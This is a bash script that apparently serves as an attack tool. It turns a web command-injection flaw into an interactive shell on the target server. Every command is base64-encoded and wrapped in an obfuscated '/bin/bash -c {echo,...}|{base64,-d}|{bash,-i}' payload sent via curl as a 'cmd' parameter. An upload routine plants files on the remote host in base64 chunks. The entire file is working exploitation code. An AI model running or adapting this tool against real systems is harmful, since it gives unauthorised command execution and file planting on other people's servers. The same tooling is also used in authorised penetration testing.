usage()
{
  echo -ne \
    "First, edit the function send_payload and build_payload.\n" \
    "usage: $0 -u TARGET_URL [-i | --interactive]\n"   \
    "\techo test\n" \
    "\ttest\n"      \
    "\texit\n"      \
    "\tBye\n"
}

encode_command()
{
  echo $1 | base64 -w 0
}

# Edit this payload
build_payload()
{
  echo "/bin/bash -c \"{echo,$1}|{base64,-d}|{bash,-i}\""
}

# Edit this request
send_payload()
{
  raw=$(curl -s "$url" -G --data-urlencode "cmd=$1")
  echo "$raw" # Return the command output
}

execute_command()
{
  cmd=$1
  encoded_cmd=$(encode_command "$cmd")
  payload=$(build_payload "$encoded_cmd")
  response=$(send_payload "$payload")
  echo "$response"
}

build_absolute_path()
{
  base_path=$1
  file_name=$2
  full_path="$file_name"
  if [[ "$full_path" != \/* ]]; then
    file_name=$(echo $file_name | sed 's/^.\///')
    full_path="$base_path/$file_name"
  fi
  echo "$full_path"
}

compress_file()
{
  file=$1
  compressed_file="$file.gz"
  gzip -c $file > $compressed_file
  echo $compressed_file
}

decompress_file()
{
  file=$1
  out=$(execute_command "gzip -d $file")
}

send_file()
{
  local=$1
  remote=$2
  b64=$(base64 "$local")
  for l in $b64; do
    out=$(execute_command "echo $l >> $remote.tmp")
  done
  out=$(execute_command "base64 -d $remote.tmp > $remote")
  out=$(execute_command "rm $remote.tmp")
}

upload_file()
{
  remote_path=$1
  read -ep "Local file: " local
  read -ep "Target file: " remote
  local=$(build_absolute_path $(pwd) "$local")
  remote=$(build_absolute_path "$remote_path" "$remote")
  echo "$local will be upload to $remote"
  read -ep "Confirm (y/N) " confirm

  if [[ "$confirm" == "Y" || "$confirm" == "y" ]]; then
    read -ep "Do you want to compress with gzip (Y/n) " compression
    echo "Sending file"
    if [[ "$compression" == "N" || "$compression" == "n" ]]; then
      send_file $local $remote
    else
      local_compressed=$(compress_file $local)
      remote_compressed="$remote.gz"
      send_file $local_compressed $remote_compressed
      decompress_file $remote_compressed
      rm $local_compressed
    fi
    echo "File uploaded"
  fi
}

better_shell()
{
  while :; do
    read -e command
    if [ "$command" == "exit" ]; then 
      break
    fi
    result=$(execute_command "$command")
    echo -e "$result" >&2
  done
}

almost_interactive_shell()
{
  history -c
  user=$(execute_command "whoami")
  hostname=$(execute_command "hostname")
  path=$(execute_command "pwd")
  while :; do
    read -ep "$user@$hostname:$path$ " command
    if [ "$command" == "exit" ]; then 
      break
    elif [ "$command" == "upload" ]; then
      upload_file $path
      continue
    fi
    history -s "$command"
    result=$(execute_command "cd $path; $command 2>&1; pwd")
    command_output=$(echo -ne "$result" | head -n -1)
    if [[ -n "$command_output" ]]; then 
      echo -e "$command_output" >&2
    fi
    path=$(echo -ne "$result" | tail -n 1)
  done
}

if [[ $# -eq 0 ]]; then
  usage
  exit 0
fi

interactive=0
while [ "$1" != "" ]; do
 case $1 in 
   -i | --interactive ) interactive=1
                        ;;
   -u | --url )   shift
                  url=$1
                  ;;
   -h | --help )  usage
                  exit
                  ;;
   * )            usage
                  exit 1
 esac
 shift
done

if [[ $interactive == 1 ]]; then
  almost_interactive_shell
else 
  better_shell
fi

echo "Bye"

